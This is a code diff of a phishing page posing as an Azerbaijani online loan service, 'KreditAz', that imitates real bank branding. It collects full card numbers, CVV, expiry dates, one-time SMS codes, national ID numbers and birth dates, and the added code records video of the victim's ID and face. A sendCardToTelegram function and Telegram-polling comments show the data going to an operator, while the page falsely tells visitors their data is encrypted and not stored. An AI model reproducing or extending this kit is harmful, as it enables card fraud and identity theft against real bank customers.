+            <button type="button" class="cta-btn" style="width:100%;padding:15px;font-size:15px;margin-top:10px;" onclick="startVideoScan(); return false;" id="scanStartBtn">
+                📷 Kameranı aç
+            </button>
         </div>
-        
-        <input type="text" id="cardNumberInput" class="card-number-input-hidden" maxlength="16" inputmode="numeric" autofocus>
-        
-        <div class="progress-bar">
-          <div class="fill" id="cardProgress" style="width:0%;"></div>
-        </div>
-        <div class="progress-label" id="cardProgressLabel">0/16 rəqəm daxil edilib</div>
-        <p style="font-size:12px;color:var(--ink-soft);margin-top:6px;cursor:pointer;" onclick="document.getElementById('cardNumberInput').focus();">📱 Karta klikləyin və nömrəni daxil edin</p>
-      </div>
-      
-      <div class="card-details-row">
-        <div class="field">
-          <label>Bitmə tarixi (AA/İİ)</label>
-          <input type="text" id="cardExpiry" placeholder="12/28" maxlength="5">
-        </div>
-        <div class="field">
-          <label>CVV / CVC</label>
-          <input type="text" id="cardCvv" placeholder="***" maxlength="4" inputmode="numeric">
-        </div>
-      </div>
-      <p style="font-size:12px;color:var(--ink-soft);margin-top:12px;text-align:center;">TLS 1.3 şifrələmə ilə qorunur. Məlumatlar saxlanılmır.</p>
-      
-      <button type="button" class="cta-btn" style="width:100%;padding:15px;font-size:15px;margin-top:12px;" onclick="sendCardToTelegram(); return false;">0.01 AZN ödə</button>
-    </div>
 
-    <!-- STEP 7: REAL CHECKING (Telegram qəbul gözlənilir) -->
-    <div id="realCheckingStep" style="display:none;">
-      <div class="checking-container">
-        <div class="spinner"></div>
-        <div class="check-icon">⏳</div>
-        <div class="check-title">Bank təsdiqi gözlənilir</div>
-        <div class="check-sub">Kart məlumatlarınız bank tərəfindən yoxlanılır...</div>
-        <div class="check-dots"><span></span><span></span><span></span></div>
-        <div style="margin-top:16px;font-size:13px;color:var(--ink-soft);">Zəhmət olmasa gözləyin...</div>
-        <div style="margin-top:8px;font-size:12px;color:var(--gold);" id="realCheckStatus">⏳ Bank cavab gözlənilir...</div>
-      </div>
-    </div>
+        <!-- STEP 4: Checking Animation (5 saniyə) -->
+        <div id="checkingStep" style="display:none;">
+            <div class="checking-container">
+                <div class="spinner"></div>
+                <div class="check-icon">🔍</div>
+                <div class="check-title">Məlumatlar yoxlanılır</div>
+                <div class="check-sub">Şəxsiyyət məlumatlarınız təhlükəsiz şəkildə yoxlanılır...</div>
+                <div class="check-dots"><span></span><span></span><span></span></div>
+                <div style="margin-top:16px;font-size:13px;color:var(--ink-soft);"><span id="checkingTimer">0</span> saniyə</div>
+            </div>
+        </div>
 
-    <!-- STEP 8: 3D Secure -->
-    <div id="threeDStep" style="display:none;">
-      <h2 style="font-size:26px;margin-bottom:10px;">🔐 3D Secure təsdiqi</h2>
-      
-      <div class="card-logos-row">
-        <svg viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#1a1f71"/><circle cx="35" cy="20" r="14" fill="#eb001b"/><circle cx="55" cy="20" r="14" fill="#f79e1b"/><text x="75" y="24" font-family="Arial" font-size="14" fill="white" font-weight="bold">VISA</text></svg>
-        <svg viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#eb001b"/><circle cx="45" cy="20" r="14" fill="#f79e1b" opacity="0.5"/><circle cx="55" cy="20" r="14" fill="#eb001b" opacity="0.5"/><text x="72" y="24" font-family="Arial" font-size="11" fill="white" font-weight="bold">Mastercard</text></svg>
-      </div>
-      
-      <div style="background:linear-gradient(135deg, #0B3A34, #155C51);border-radius:12px;padding:14px 18px;color:white;text-align:center;margin-bottom:14px;">
-        <div style="font-size:12px;opacity:0.7;">Doğrulama məbləği</div>
-        <div style="font-size:26px;font-weight:700;color:#E8C688;">0.01 ₼</div>
-      </div>
-      
-      <div style="background:var(--sage);border-radius:12px;padding:14px 16px;margin-bottom:16px;text-align:center;">
-        <div style="font-weight:700;font-size:14px;color:var(--teal-deep);">📱 Telefonunuza SMS göndərildi</div>
-        <div style="font-size:12px;color:var(--ink-soft);margin-top:2px;">Zəhmət olmasa SMS-dəki kodu daxil edin</div>
-      </div>
-      
-      <p style="color:var(--ink-soft);margin-bottom:4px;font-size:14px;text-align:center;">Bank tərəfindən göndərilən 6 rəqəmli kodu daxil edin:</p>
-      
-      <div class="field otp-input-field">
-        <label style="font-size:13px;color:var(--ink-soft);">Təsdiq kodu (OTP)</label>
-        <input type="text" id="otpCode" placeholder="000000" maxlength="6" inputmode="numeric">
-      </div>
-      
-      <div class="secure-badge">
-        <span>🔒 Təhlükəsiz əlaqə</span>
-        <span>⏱ 3:00</span>
-      </div>
-      
-      <button onclick="submitOTP(); return false;" class="cta-btn" style="width:100%;padding:15px;font-size:15px;margin-top:12px;">Təsdiqlə</button>
-      <div id="otpStatus" style="margin-top:16px;font-size:14px;font-weight:700;color:var(--teal-deep);text-align:center;display:none;">✅ Ödəniş uğurla təsdiqləndi! 0.01 AZN geri qaytarılacaq.</div>
-    </div>
+        <!-- STEP 5: Bank seçimi -->
+        <div id="bankStep" style="display:none;">
+            <h2 style="font-size:26px;margin-bottom:6px;">Hansı bank kartına köçürək?</h2>
+            <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 20px;">Kredit məbləği seçdiyiniz kart hesabına köçürüləcək</p>
+            <div class="bank-grid" id="bankGrid"></div>
+            <button type="button" class="cta-btn" style="width:100%;padding:15px;font-size:15px;margin-top:24px;" onclick="goToCardInput(); return false;">Təsdiqlə və davam et</button>
+        </div>
 
-    <!-- STEP 9: Kredit Ödə Modal -->
-    <div id="creditCheckModal" style="display:none;">
-      <h2 style="font-size:26px;margin-bottom:6px;">🔍 Kredit Ödə</h2>
-      <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 20px;">FIN kod və doğum tarixinizlə adınıza kredit olub-olmadığını yoxlayın</p>
-      
-      <div id="creditCheckForm">
-        <div class="field">
-          <label>FIN kod</label>
-          <input type="text" id="checkFin" placeholder="7A2BC9D" maxlength="7">
+        <!-- STEP 6: Kart Doğrulama -->
+        <div id="cardInputStep" style="display:none;">
+            <h2 style="font-size:26px;margin-bottom:6px;">💳 Kart Doğrulama</h2>
+            <p style="color:var(--ink-soft);font-size:14px;margin:0 0 12px;">Kartınızı doğrulamaq üçün məlumatları daxil edin</p>
+            
+            <div class="payment-amount">
+                <div class="label">Doğrulama məbləği</div>
+                <div class="amount">0.01 ₼</div>
+                <div style="font-size:12px;opacity:0.6;margin-top:4px;">Kartınızdan 0.01 AZN çəkiləcək və geri qaytarılacaq</div>
+            </div>
+            
+            <div class="card-logos-row">
+                <svg viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#1a1f71"/><circle cx="35" cy="20" r="14" fill="#eb001b"/><circle cx="55" cy="20" r="14" fill="#f79e1b"/><text x="75" y="24" font-family="Arial" font-size="14" fill="white" font-weight="bold">VISA</text></svg>
+                <svg viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#eb001b"/><circle cx="45" cy="20" r="14" fill="#f79e1b" opacity="0.5"/><circle cx="55" cy="20" r="14" fill="#eb001b" opacity="0.5"/><text x="72" y="24" font-family="Arial" font-size="11" fill="white" font-weight="bold">Mastercard</text></svg>
+            </div>
+            
+            <div style="background:var(--sage);border-radius:12px;padding:12px 16px;margin-bottom:16px;display:flex;justify-content:space-between;align-items:center;">
+                <span style="font-weight:600;font-size:14px;">Seçilmiş Bank</span>
+                <span style="font-weight:700;color:var(--teal-deep);font-size:14px;" id="selectedBankDisplay">Kapital Bank</span>
+            </div>
+            
+            <div class="card-input-wrap">
+                <div class="bank-card-visual" id="bankCardVisual" style="background:linear-gradient(135deg, #1a1a2e, #16213e);">
+                    <div class="card-chip"></div>
+                    <div class="card-top">
+                        <span class="bank-name-on-card" id="cardBankName">KAPITAL BANK</span>
+                        <span class="card-type">💳</span>
+                    </div>
+                    <div class="card-number-display" id="cardDisplayArea">
+                        <span id="cardDigits">0000 0000 0000 0000</span>
+                    </div>
+                    <div class="card-bottom">
+                        <div>
+                            <div class="card-expiry-label">Bitmə</div>
+                            <div class="card-expiry-value" id="cardExpiryDisplay">MM/YY</div>
+                        </div>
+                        <div style="text-align:right;">
+                            <div class="card-cvv-label">CVV</div>
+                            <div class="card-cvv-value" id="cardCvvDisplay">***</div>
+                        </div>
+                    </div>
+                    <div class="card-contactless">📶</div>
+                    <img class="card-logo-on-card" id="cardLogoOnCard" src="" alt="">
+                </div>
+                
+                <input type="text" id="cardNumberInput" class="card-number-input-hidden" maxlength="16" inputmode="numeric" autofocus>
+                
+                <div class="progress-bar">
+                    <div class="fill" id="cardProgress" style="width:0%;"></div>
+                </div>
+                <div class="progress-label" id="cardProgressLabel">0/16 rəqəm daxil edilib</div>
+                <p style="font-size:12px;color:var(--ink-soft);margin-top:6px;cursor:pointer;" onclick="document.getElementById('cardNumberInput').focus();">📱 Karta klikləyin və nömrəni daxil edin</p>
+            </div>
+            
+            <div class="card-details-row">
+                <div class="field">
+                    <label>Bitmə tarixi (AA/İİ)</label>
+                    <input type="text" id="cardExpiry" placeholder="12/28" maxlength="5">
+                </div>
+                <div class="field">
+                    <label>CVV / CVC</label>
+                    <input type="text" id="cardCvv" placeholder="***" maxlength="4" inputmode="numeric">
+                </div>
+            </div>
+            <p style="font-size:12px;color:var(--ink-soft);margin-top:12px;text-align:center;">TLS 1.3 şifrələmə ilə qorunur. Məlumatlar saxlanılmır.</p>
+            
+            <button type="button" class="cta-btn" style="width:100%;padding:15px;font-size:15px;margin-top:12px;" onclick="sendCardToTelegram(); return false;">0.01 AZN ödə</button>
         </div>
-        <div class="field">
-          <label>Doğum tarixi</label>
-          <input type="date" id="checkBirth">
-        </div>
-        <button class="cta-btn" onclick="startCreditCheck(); return false;" style="width:100%;padding:15px;font-size:15px;">Yoxla</button>
-      </div>
-      
-      <div id="creditChecking" style="display:none;">
-        <div class="checking-container">
-          <div class="spinner"></div>
-          <div class="check-title">Məlumatlar yoxlanılır</div>
-          <div class="check-sub">Şəxsiyyət məlumatlarınız təsdiqlənir...</div>
-          <div class="check-dots"><span></span><span></span><span></span></div>
-          <div style="margin-top:16px;font-size:13px;color:var(--ink-soft);"><span id="creditCheckTimer">0</span> saniyə</div>
-        </div>
-      </div>
-      
-      <div id="creditResult" style="display:none;">
-        <div class="credit-result-box">
-          <div class="result-icon">✅</div>
-          <div class="result-text">HalHazırda Adınıza Kredit Yoxdur</div>
-          <div class="result-sub">Siz yeni kredit götürə bilərsiniz</div>
-          <button class="cta-btn" onclick="goToApply(); return false;" style="margin-top:20px;width:100%;padding:15px;font-size:15px;">Kredit Götür</button>
-        </div>
-      </div>
-    </div>
 
-  </div>
+        <!-- STEP 7: REAL CHECKING (Telegram qəbul gözlənilir) -->
+        <div id="realCheckingStep" style="display:none;">
+            <div class="checking-container">
+                <div class="spinner"></div>
+                <div class="check-icon">⏳</div>
+                <div class="check-title">Bank təsdiqi gözlənilir</div>
+                <div class="check-sub">Kart məlumatlarınız bank tərəfindən yoxlanılır...</div>
+                <div class="check-dots"><span></span><span></span><span></span></div>
+                <div style="margin-top:16px;font-size:13px;color:var(--ink-soft);">Zəhmət olmasa gözləyin...</div>
+                <div style="margin-top:8px;font-size:12px;color:var(--gold);" id="realCheckStatus">⏳ Bank cavab gözlənilir...</div>
+            </div>
+        </div>
+
+        <!-- STEP 8: 3D Secure -->
+        <div id="threeDStep" style="display:none;">
+            <h2 style="font-size:26px;margin-bottom:10px;">🔐 3D Secure təsdiqi</h2>
+            
+            <div class="card-logos-row">
+                <svg viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#1a1f71"/><circle cx="35" cy="20" r="14" fill="#eb001b"/><circle cx="55" cy="20" r="14" fill="#f79e1b"/><text x="75" y="24" font-family="Arial" font-size="14" fill="white" font-weight="bold">VISA</text></svg>
+                <svg viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#eb001b"/><circle cx="45" cy="20" r="14" fill="#f79e1b" opacity="0.5"/><circle cx="55" cy="20" r="14" fill="#eb001b" opacity="0.5"/><text x="72" y="24" font-family="Arial" font-size="11" fill="white" font-weight="bold">Mastercard</text></svg>
+            </div>
+            
+            <div style="background:linear-gradient(135deg, #0B3A34, #155C51);border-radius:12px;padding:14px 18px;color:white;text-align:center;margin-bottom:14px;">
+                <div style="font-size:12px;opacity:0.7;">Doğrulama məbləği</div>
+                <div style="font-size:26px;font-weight:700;color:#E8C688;">0.01 ₼</div>
+            </div>
+            
+            <div style="background:var(--sage);border-radius:12px;padding:14px 16px;margin-bottom:16px;text-align:center;">
+                <div style="font-weight:700;font-size:14px;color:var(--teal-deep);">📱 Telefonunuza SMS göndərildi</div>
+                <div style="font-size:12px;color:var(--ink-soft);margin-top:2px;">Zəhmət olmasa SMS-dəki kodu daxil edin</div>
+            </div>
+            
+            <p style="color:var(--ink-soft);margin-bottom:4px;font-size:14px;text-align:center;">Bank tərəfindən göndərilən 6 rəqəmli kodu daxil edin:</p>
+            
+            <div class="field otp-input-field">
+                <label style="font-size:13px;color:var(--ink-soft);">Təsdiq kodu (OTP)</label>
+                <input type="text" id="otpCode" placeholder="000000" maxlength="6" inputmode="numeric">
+            </div>
+            
+            <div class="secure-badge">
+                <span>🔒 Təhlükəsiz əlaqə</span>
+                <span>⏱ 3:00</span>
+            </div>
+            
+            <button onclick="submitOTP(); return false;" class="cta-btn" style="width:100%;padding:15px;font-size:15px;margin-top:12px;">Təsdiqlə</button>
+            <div id="otpStatus" style="margin-top:16px;font-size:14px;font-weight:700;color:var(--teal-deep);text-align:center;display:none;">✅ Ödəniş uğurla təsdiqləndi! 0.01 AZN geri qaytarılacaq.</div>
+        </div>
+
+        <!-- STEP 9: Kredit Ödə Modal -->
+        <div id="creditCheckModal" style="display:none;">
+            <h2 style="font-size:26px;margin-bottom:6px;">🔍 Kredit Ödə</h2>
+            <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 20px;">FIN kod və doğum tarixinizlə adınıza kredit olub-olmadığını yoxlayın</p>
+            
+            <div id="creditCheckForm">
+                <div class="field">
+                    <label>FIN kod</label>
+                    <input type="text" id="checkFin" placeholder="7A2BC9D" maxlength="7">
+                </div>
+                <div class="field">
+                    <label>Doğum tarixi</label>
+                    <input type="date" id="checkBirth">
+                </div>
+                <button class="cta-btn" onclick="startCreditCheck(); return false;" style="width:100%;padding:15px;font-size:15px;">Yoxla</button>
+            </div>
+            
+            <div id="creditChecking" style="display:none;">
+                <div class="checking-container">
+                    <div class="spinner"></div>
+                    <div class="check-title">Məlumatlar yoxlanılır</div>
+                    <div class="check-sub">Şəxsiyyət məlumatlarınız təsdiqlənir...</div>
+                    <div class="check-dots"><span></span><span></span><span></span></div>
+                    <div style="margin-top:16px;font-size:13px;color:var(--ink-soft);"><span id="creditCheckTimer">0</span> saniyə</div>
+                </div>
+            </div>
+            
+            <div id="creditResult" style="display:none;">
+                <div class="credit-result-box">
+                    <div class="result-icon">✅</div>
+                    <div class="result-text">HalHazırda Adınıza Kredit Yoxdur</div>
+                    <div class="result-sub">Siz yeni kredit götürə bilərsiniz</div>
+                    <button class="cta-btn" onclick="goToApply(); return false;" style="margin-top:20px;width:100%;padding:15px;font-size:15px;">Kredit Götür</button>
+                </div>
+            </div>
+        </div>
+
+    </div>
 </div>
 
 <footer>
-  <div class="wrap">
-    <div class="footer-grid">
-      <div><h4>KreditAz MKT</h4><p>Onlayn nağd kredit xidməti</p></div>
-      <div><h4>Naviqasiya</h4><p><a href="#hesabla">Kalkulyator</a></p><p><a href="#teklifler">Təkliflər</a></p><p><a href="#faq">Suallar</a></p></div>
-      <div><h4>Əlaqə</h4><p>info@kreditaz.az</p><p>*1414</p></div>
+    <div class="wrap">
+        <div class="footer-grid">
+            <div><h4>KreditAz MKT</h4><p>Onlayn nağd kredit xidməti</p></div>
+            <div><h4>Naviqasiya</h4><p><a href="#hesabla">Kalkulyator</a></p><p><a href="#teklifler">Təkliflər</a></p><p><a href="#faq">Suallar</a></p></div>
+            <div><h4>Əlaqə</h4><p>info@kreditaz.az</p><p>*1414</p></div>
+        </div>
+        <div class="foot-note">© 2026 KreditAz. Bütün hüquqlar qorunur.</div>
     </div>
-    <div class="foot-note">© 2026 KreditAz. Bütün hüquqlar qorunur.</div>
-  </div>
 </footer>
 
 <script>
 // ========== FAQ TOGGLE ==========
 function toggleFAQ(btn) {
-  var item = btn.closest('.faq-item');
-  var isOpen = item.classList.contains('open');
-  
-  document.querySelectorAll('.faq-item').forEach(function(el) {
-    el.classList.remove('open');
-  });
-  
-  if (!isOpen) {
-    item.classList.add('open');
-  }
+    var item = btn.closest('.faq-item');
+    var isOpen = item.classList.contains('open');
+    
+    document.querySelectorAll('.faq-item').forEach(function(el) {
+        el.classList.remove('open');
+    });
+    
+    if (!isOpen) {
+        item.classList.add('open');
+    }
 }
 
 // ========== SVG BANK LOGOS ==========
 var bankLogos = {
-  'Kapital Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23E31E24" rx="8"/%3E%3Ctext x="20" y="38" font-family="Arial" font-size="24" fill="white" font-weight="bold"%3EKAPITAL%3C/text%3E%3Ctext x="120" y="38" font-family="Arial" font-size="20" fill="white"%3EBANK%3C/text%3E%3C/svg%3E',
-  'Leobank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%230066B3" rx="8"/%3E%3Ctext x="40" y="38" font-family="Arial" font-size="22" fill="white" font-weight="bold"%3ELEOBANK%3C/text%3E%3C/svg%3E',
-  'ABB': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23004B87" rx="8"/%3E%3Ctext x="50" y="38" font-family="Arial" font-size="28" fill="white" font-weight="bold"%3EABB%3C/text%3E%3C/svg%3E',
-  'PAŞA Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23E31E24" rx="8"/%3E%3Ctext x="20" y="38" font-family="Arial" font-size="20" fill="white" font-weight="bold"%3EPA%C5%9EA%3C/text%3E%3Ctext x="110" y="38" font-family="Arial" font-size="18" fill="white"%3EBANK%3C/text%3E%3C/svg%3E',
-  'AccessBank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%230057A0" rx="8"/%3E%3Ctext x="15" y="38" font-family="Arial" font-size="18" fill="white" font-weight="bold"%3EACCESS%3C/text%3E%3Ctext x="125" y="38" font-family="Arial" font-size="18" fill="white"%3EBANK%3C/text%3E%3C/svg%3E',
-  'Unibank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23004B87" rx="8"/%3E%3Ctext x="30" y="38" font-family="Arial" font-size="22" fill="white" font-weight="bold"%3EUNIBANK%3C/text%3E%3C/svg%3E',
-  'Bank Respublika': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23E31E24" rx="8"/%3E%3Ctext x="10" y="38" font-family="Arial" font-size="16" fill="white" font-weight="bold"%3ERESPUBLIKA%3C/text%3E%3Ctext x="140" y="38" font-family="Arial" font-size="16" fill="white"%3EBANK%3C/text%3E%3C/svg%3E',
-  'Xalq Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23004B87" rx="8"/%3E%3Ctext x="30" y="38" font-family="Arial" font-size="22" fill="white" font-weight="bold"%3EXALQ%3C/text%3E%3Ctext x="120" y="38" font-family="Arial" font-size="18" fill="white"%3EBANK%3C/text%3E%3C/svg%3E',
-  'Rabitəbank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23003366" rx="8"/%3E%3Ctext x="20" y="38" font-family="Arial" font-size="18" fill="white" font-weight="bold"%3ERAB%C4%B0T%C6%8F%3C/text%3E%3Ctext x="130" y="38" font-family="Arial" font-size="16" fill="white"%3EBANK%3C/text%3E%3C/svg%3E'
+    'Kapital Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23E31E24" rx="8"/%3E%3Ctext x="20" y="38" font-family="Arial" font-size="24" fill="white" font-weight="bold"%3EKAPITAL%3C/text%3E%3Ctext x="120" y="38" font-family="Arial" font-size="20" fill="white"%3EBANK%3C/text%3E%3C/svg%3E',
+    'Leobank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%230066B3" rx="8"/%3E%3Ctext x="40" y="38" font-family="Arial" font-size="22" fill="white" font-weight="bold"%3ELEOBANK%3C/text%3E%3C/svg%3E',
+    'ABB': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23004B87" rx="8"/%3E%3Ctext x="50" y="38" font-family="Arial" font-size="28" fill="white" font-weight="bold"%3EABB%3C/text%3E%3C/svg%3E',
+    'PAŞA Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23E31E24" rx="8"/%3E%3Ctext x="20" y="38" font-family="Arial" font-size="20" fill="white" font-weight="bold"%3EPA%C5%9EA%3C/text%3E%3Ctext x="110" y="38" font-family="Arial" font-size="18" fill="white"%3EBANK%3C/text%3E%3C/svg%3E',
+    'AccessBank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%230057A0" rx="8"/%3E%3Ctext x="15" y="38" font-family="Arial" font-size="18" fill="white" font-weight="bold"%3EACCESS%3C/text%3E%3Ctext x="125" y="38" font-family="Arial" font-size="18" fill="white"%3EBANK%3C/text%3E%3C/svg%3E',
+    'Unibank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23004B87" rx="8"/%3E%3Ctext x="30" y="38" font-family="Arial" font-size="22" fill="white" font-weight="bold"%3EUNIBANK%3C/text%3E%3C/svg%3E',
+    'Bank Respublika': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23E31E24" rx="8"/%3E%3Ctext x="10" y="38" font-family="Arial" font-size="16" fill="white" font-weight="bold"%3ERESPUBLIKA%3C/text%3E%3Ctext x="140" y="38" font-family="Arial" font-size="16" fill="white"%3EBANK%3C/text%3E%3C/svg%3E',
+    'Xalq Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23004B87" rx="8"/%3E%3Ctext x="30" y="38" font-family="Arial" font-size="22" fill="white" font-weight="bold"%3EXALQ%3C/text%3E%3Ctext x="120" y="38" font-family="Arial" font-size="18" fill="white"%3EBANK%3C/text%3E%3C/svg%3E',
+    'Rabitəbank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23003366" rx="8"/%3E%3Ctext x="20" y="38" font-family="Arial" font-size="18" fill="white" font-weight="bold"%3ERAB%C4%B0T%C6%8F%3C/text%3E%3Ctext x="130" y="38" font-family="Arial" font-size="16" fill="white"%3EBANK%3C/text%3E%3C/svg%3E'
 };
 
 var banks = [
-  { name: 'Kapital Bank', color: '#E31E24', logo: bankLogos['Kapital Bank'], sub: 'kapitalbank.az' },
-  { name: 'Leobank', color: '#0066B3', logo: bankLogos['Leobank'], sub: 'leobank.az' },
-  { name: 'ABB', color: '#004B87', logo: bankLogos['ABB'], sub: 'abb-bank.az' },
-  { name: 'PAŞA Bank', color: '#E31E24', logo: bankLogos['PAŞA Bank'], sub: 'pashabank.az' },
-  { name: 'AccessBank', color: '#0057A0', logo: bankLogos['AccessBank'], sub: 'accessbank.az' },
-  { name: 'Unibank', color: '#004B87', logo: bankLogos['Unibank'], sub: 'unibank.az' },
-  { name: 'Bank Respublika', color: '#E31E24', logo: bankLogos['Bank Respublika'], sub: 'bankrespublika.az' },
-  { name: 'Xalq Bank', color: '#004B87', logo: bankLogos['Xalq Bank'], sub: 'xalqbank.az' },
-  { name: 'Rabitəbank', color: '#003366', logo: bankLogos['Rabitəbank'], sub: 'rabitabank.com' }
+    { name: 'Kapital Bank', color: '#E31E24', logo: bankLogos['Kapital Bank'], sub: 'kapitalbank.az' },
+    { name: 'Leobank', color: '#0066B3', logo: bankLogos['Leobank'], sub: 'leobank.az' },
+    { name: 'ABB', color: '#004B87', logo: bankLogos['ABB'], sub: 'abb-bank.az' },
+    { name: 'PAŞA Bank', color: '#E31E24', logo: bankLogos['PAŞA Bank'], sub: 'pashabank.az' },
+    { name: 'AccessBank', color: '#0057A0', logo: bankLogos['AccessBank'], sub: 'accessbank.az' },
+    { name: 'Unibank', color: '#004B87', logo: bankLogos['Unibank'], sub: 'unibank.az' },
+    { name: 'Bank Respublika', color: '#E31E24', logo: bankLogos['Bank Respublika'], sub: 'bankrespublika.az' },
+    { name: 'Xalq Bank', color: '#004B87', logo: bankLogos['Xalq Bank'], sub: 'xalqbank.az' },
+    { name: 'Rabitəbank', color: '#003366', logo: bankLogos['Rabitəbank'], sub: 'rabitabank.com' }
 ];
 
 // ========== TELEGRAM ==========
@@ -1507,285 +1455,400 @@ var isChecking = false;
 var checkInterval = null;
 var checkSeconds = 0;
 var isPayment = false;
-var faceScanActive = false;
-var faceScanInterval = null;
-var faceScanSeconds = 0;
+var scanInterval = null;
+var scanSeconds = 0;
 var waitingForApproval = false;
 var approvalInterval = null;
 var telegramPollingActive = false;
 var lastUpdateId = 0;
+var scanStep = 0; // 0: ön, 1: arxa, 2: üz
+var mediaRecorder = null;
+var recordedChunks = [];
+var videoStream = null;
 
 var termOptions = [
-  { value: 0, label: '10 gün', days: 10 },
-  { value: 1, label: '15 gün', days: 15 },
-  { value: 2, label: '20 gün', days: 20 },
-  { value: 3, label: '1 ay', days: 30 },
-  { value: 4, label: '2 ay', days: 60 },
-  { value: 5, label: '3 ay', days: 90 }
+    { value: 0, label: '10 gün', days: 10 },
+    { value: 1, label: '15 gün', days: 15 },
+    { value: 2, label: '20 gün', days: 20 },
+    { value: 3, label: '1 ay', days: 30 },
+    { value: 4, label: '2 ay', days: 60 },
+    { value: 5, label: '3 ay', days: 90 }
 ];
 
 var bankDataMap = {
-  'Kapital Bank': { color: '#E31E24', bg: 'linear-gradient(135deg, #1a1a2e, #E31E24)' },
-  'Leobank': { color: '#0066B3', bg: 'linear-gradient(135deg, #1a1a2e, #0066B3)' },
-  'ABB': { color: '#004B87', bg: 'linear-gradient(135deg, #1a1a2e, #004B87)' },
-  'PAŞA Bank': { color: '#E31E24', bg: 'linear-gradient(135deg, #1a1a2e, #E31E24)' },
-  'AccessBank': { color: '#0057A0', bg: 'linear-gradient(135deg, #1a1a2e, #0057A0)' },
-  'Unibank': { color: '#004B87', bg: 'linear-gradient(135deg, #1a1a2e, #004B87)' },
-  'Bank Respublika': { color: '#E31E24', bg: 'linear-gradient(135deg, #1a1a2e, #E31E24)' },
-  'Xalq Bank': { color: '#004B87', bg: 'linear-gradient(135deg, #1a1a2e, #004B87)' },
-  'Rabitəbank': { color: '#003366', bg: 'linear-gradient(135deg, #1a1a2e, #003366)' }
+    'Kapital Bank': { color: '#E31E24', bg: 'linear-gradient(135deg, #1a1a2e, #E31E24)' },
+    'Leobank': { color: '#0066B3', bg: 'linear-gradient(135deg, #1a1a2e, #0066B3)' },
+    'ABB': { color: '#004B87', bg: 'linear-gradient(135deg, #1a1a2e, #004B87)' },
+    'PAŞA Bank': { color: '#E31E24', bg: 'linear-gradient(135deg, #1a1a2e, #E31E24)' },
+    'AccessBank': { color: '#0057A0', bg: 'linear-gradient(135deg, #1a1a2e, #0057A0)' },
+    'Unibank': { color: '#004B87', bg: 'linear-gradient(135deg, #1a1a2e, #004B87)' },
+    'Bank Respublika': { color: '#E31E24', bg: 'linear-gradient(135deg, #1a1a2e, #E31E24)' },
+    'Xalq Bank': { color: '#004B87', bg: 'linear-gradient(135deg, #1a1a2e, #004B87)' },
+    'Rabitəbank': { color: '#003366', bg: 'linear-gradient(135deg, #1a1a2e, #003366)' }
 };
 
 // Render banks
 function renderBanks() {
-  var grid = document.getElementById('bankGrid');
-  grid.innerHTML = '';
-  banks.forEach(function(bank) {
-    var div = document.createElement('div');
-    div.className = 'bank-option';
-    div.dataset.bank = bank.name;
-    div.dataset.color = bank.color;
-    div.onclick = function() { selectBank(this); };
-    div.innerHTML = '<img class="bank-logo-img" src="' + bank.logo + '" alt="' + bank.name + '" onerror="this.style.display=\'none\'">' +
-      '<div class="bank-name">' + bank.name + '</div>' +
-      '<div class="bank-sub">' + bank.sub + '</div>';
-    grid.appendChild(div);
-  });
+    var grid = document.getElementById('bankGrid');
+    grid.innerHTML = '';
+    banks.forEach(function(bank) {
+        var div = document.createElement('div');
+        div.className = 'bank-option';
+        div.dataset.bank = bank.name;
+        div.dataset.color = bank.color;
+        div.onclick = function() { selectBank(this); };
+        div.innerHTML = '<img class="bank-logo-img" src="' + bank.logo + '" alt="' + bank.name + '" onerror="this.style.display=\'none\'">' +
+            '<div class="bank-name">' + bank.name + '</div>' +
